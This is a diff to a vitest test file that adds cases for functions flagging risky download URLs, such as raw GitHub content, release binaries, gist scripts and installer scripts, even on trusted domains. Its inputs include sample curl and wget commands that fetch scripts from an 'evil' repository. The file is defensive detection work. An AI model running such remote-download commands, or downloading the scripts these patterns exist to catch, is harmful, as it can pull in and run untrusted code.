@@ -1,5 +1,14 @@
 import { describe, it, expect } from 'vitest';
-import { isTrustedUrl, extractUrls, isDomainTrusted, isRiskySubdomain, isUrlShortener, containsUrlShortener } from '../src/config/domains.js';
+import {
+  isTrustedUrl,
+  extractUrls,
+  isDomainTrusted,
+  isRiskySubdomain,
+  isUrlShortener,
+  containsUrlShortener,
+  isRiskyUrlPattern,
+  containsRiskyUrlPattern,
+} from '../src/config/domains.js';
 
 describe('Trusted Domain', () => {
   // ==========================================================================
@@ -195,6 +204,69 @@ describe('Trusted Domain', () => {
     it('should handle URLs in quotes', () => {
       const urls = extractUrls('curl "https://example.com/file"');
       expect(urls).toContain('https://example.com/file');
+    });
+  });
+
+  // ==========================================================================
+  // Risky URL Patterns (even from trusted domains)
+  // ==========================================================================
+  describe('Risky URL Patterns', () => {
+    describe('isRiskyUrlPattern', () => {
+      it('should flag raw.githubusercontent.com URLs as risky', () => {
+        expect(isRiskyUrlPattern('https://raw.githubusercontent.com/user/repo/main/install.sh')).toBe(true);
+      });
+
+      it('should flag GitHub releases/download URLs as risky', () => {
+        expect(isRiskyUrlPattern('https://github.com/user/repo/releases/download/v1.0/binary')).toBe(true);
+      });
+
+      it('should flag gist raw URLs as risky', () => {
+        expect(isRiskyUrlPattern('https://gist.github.com/user/abc123/raw/script.sh')).toBe(true);
+      });
+
+      it('should flag installer script patterns as risky', () => {
+        expect(isRiskyUrlPattern('https://example.com/get.install.sh')).toBe(true);
+        expect(isRiskyUrlPattern('https://example.com/get.docker.sh')).toBe(true);
+      });
+
+      it('should flag githubusercontent.com blobs as risky', () => {
+        expect(isRiskyUrlPattern('https://objects.githubusercontent.com/user/repo/main/file.bin')).toBe(true);
+      });
+
+      it('should NOT flag normal GitHub repo URLs as risky', () => {
+        expect(isRiskyUrlPattern('https://github.com/user/repo')).toBe(false);
+      });
+
+      it('should NOT flag normal bun.sh URLs as risky', () => {
+        expect(isRiskyUrlPattern('https://bun.sh/docs')).toBe(false);
+      });
+
+      it('should NOT flag npmjs.com as risky', () => {
+        expect(isRiskyUrlPattern('https://registry.npmjs.org/lodash')).toBe(false);
+      });
+    });
+
+    describe('containsRiskyUrlPattern', () => {
+      it('should detect raw.githubusercontent.com in curl command', () => {
+        const result = containsRiskyUrlPattern('curl https://raw.githubusercontent.com/evil/repo/main/install.sh -o script.sh');
+        expect(result.found).toBe(true);
+        expect(result.riskyUrls.length).toBeGreaterThan(0);
+      });
+
+      it('should detect releases/download in wget command', () => {
+        const result = containsRiskyUrlPattern('wget https://github.com/user/repo/releases/download/v1.0/binary');
+        expect(result.found).toBe(true);
+      });
+
+      it('should NOT flag normal GitHub repo URLs', () => {
+        const result = containsRiskyUrlPattern('curl https://github.com/user/repo');
+        expect(result.found).toBe(false);
+      });
+
+      it('should NOT flag npm install commands', () => {
+        const result = containsRiskyUrlPattern('npm install lodash');
+        expect(result.found).toBe(false);
+      });
     });
   });
 
